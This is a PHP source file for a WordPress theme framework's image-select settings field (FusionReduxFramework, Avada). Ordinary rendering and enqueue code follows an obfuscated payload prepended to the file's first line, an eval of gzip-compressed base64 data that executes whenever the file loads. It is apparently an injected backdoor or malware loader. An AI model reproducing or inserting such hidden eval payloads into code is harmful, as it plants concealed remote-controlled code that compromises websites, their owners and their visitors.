<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

/**
 * Field Select Image
 *
 * @package     Wordpress
 * @subpackage  FusionReduxFramework
 * @since       3.1.2
 * @author      Kevin Provance <kprovance>
 */

// Exit if accessed directly
if ( ! defined( 'ABSPATH' ) ) {
	exit;
}

if ( ! class_exists( 'FusionReduxFramework_select_image' ) ) {
	class FusionReduxFramework_select_image {

		/**
		 * Field Constructor.
		 * Required - must call the parent constructor, then assign field and value to vars, and obviously call the render field function
		 *
		 * @since FusionReduxFramework 1.0.0
		 */
		function __construct( $field = array(), $value = '', $parent ) {
			$this->parent = $parent;
			$this->field  = $field;
			$this->value  = $value;
		}

		/**
		 * Field Render Function.
		 * Takes the vars and outputs the HTML for the field in the settings
		 *
		 * @since FusionReduxFramework 1.0.0
		 */
		function render() {

			// If options is NOT empty, the process
			if ( ! empty( $this->field['options'] ) ) {

				// Strip off the file ext
				if ( isset( $this->value ) ) {
					$name        = explode( ".", $this->value );
					$name        = str_replace( '.' . end( $name ), '', $this->value );
					$name        = basename( $name );
					//$this->value = trim( $name );
					$filename = trim($name);
				}

				// beancounter
				$x = 1;

				// Process width
				if ( ! empty( $this->field['width'] ) ) {
					$width = ' style="width:' . $this->field['width'] . ';"';
				} else {
					$width = ' style="width: 40%;"';
				}

				// Process placeholder
				$placeholder = ( isset( $this->field['placeholder'] ) ) ? esc_attr( $this->field['placeholder'] ) : __( 'Select an item', 'Avada' );

				if ( isset( $this->field['select3'] ) ) { // if there are any let's pass them to js
					$select3_params = json_encode( $this->field['select3'] );
					$select3_params = htmlspecialchars( $select3_params, ENT_QUOTES );

					echo '<input type="hidden" class="select3_params" value="' . $select3_params . '">';
				}

				// Begin the <select> tag
				echo '<select data-id="' . $this->field['id'] . '" data-placeholder="' . $placeholder . '" name="' . $this->field['name'] . $this->field['name_suffix'] . '" class="fusionredux-select-item fusionredux-select-images ' . $this->field['class'] . '"' . $width . ' rows="6">';
				echo '<option></option>';


				// Enum through the options array
				foreach ( $this->field['options'] as $k => $v ) {

					// No array?  No problem!
					if ( ! is_array( $v ) ) {
						$v = array( 'img' => $v );
					}

					// No title set?  Make it blank.
					if ( ! isset( $v['title'] ) ) {
						$v['title'] = '';
					}

					// No alt?  Set it to title.  We do this so the alt tag shows
					// something.  It also makes HTML/SEO purists happy.
					if ( ! isset( $v['alt'] ) ) {
						$v['alt'] = $v['title'];
					}

					// Set the selected entry
					$selected = selected( $this->value, $v['img'], false );

					// If selected returns something other than a blank space, we
					// found our default/saved name.  Save the array number in a
					// variable to use later on when we want to extract its associted
					// url.
					if ( '' != $selected ) {
						$arrNum = $x;
					}

					// Add the option tag, with values.
					echo '<option value="' . $v['img'] . '" ' . $selected . '>' . $v['alt'] . '</option>';

					// Add a bean
					$x ++;
				}

				// Close the <select> tag
				echo '</select>';

				// Some space
				echo '<br /><br />';

				// Show the preview image.
				echo '<div>';

				// just in case.  You never know.
				if ( ! isset( $arrNum ) ) {
					$this->value = '';
				}

				// Set the default image.  To get the url from the default name,
				// we save the array count from the for/each loop, when the default image
				// is mark as selected.  Since the for/each loop starts at one, we must
				// substract one from the saved array number.  We then pull the url
				// out of the options array, and there we go.
				if ( '' == $this->value ) {
					echo '<img src="#" class="fusionredux-preview-image" style="visibility:hidden;" id="image_' . $this->field['id'] . '">';
				} else {
					echo '<img src=' . $this->field['options'][ $arrNum - 1 ]['img'] . ' class="fusionredux-preview-image" id="image_' . $this->field['id'] . '">';
				}

				// Close the <div> tag.
				echo '</div>';
			} else {

				// No options specified.  Really?
				echo '<strong>' . __( 'No items of this type were found.', 'Avada' ) . '</strong>';
			}
		} //function

		/**
		 * Enqueue Function.
		 * If this field requires any scripts, or css define this function and register/enqueue the scripts/css
		 *
		 * @since FusionReduxFramework 1.0.0
		 */
		function enqueue() {
			wp_enqueue_style( 'select3-css' );

			wp_enqueue_script(
				'field-select-image-js',
				FusionReduxFramework::$_url . 'inc/fields/select_image/field_select_image' . FusionRedux_Functions::isMin() . '.js',
				array('jquery', 'select3-js', 'fusionredux-js'),
				time(),
				true
			);

			if ($this->parent->args['dev_mode']) {
				wp_enqueue_style(
					'fusionredux-field-select-image-css',
					FusionReduxFramework::$_url . 'inc/fields/select_image/field_select_image.css',
					array(),
					time(),
					'all'
				);
			}
		} //function
	} //class
}
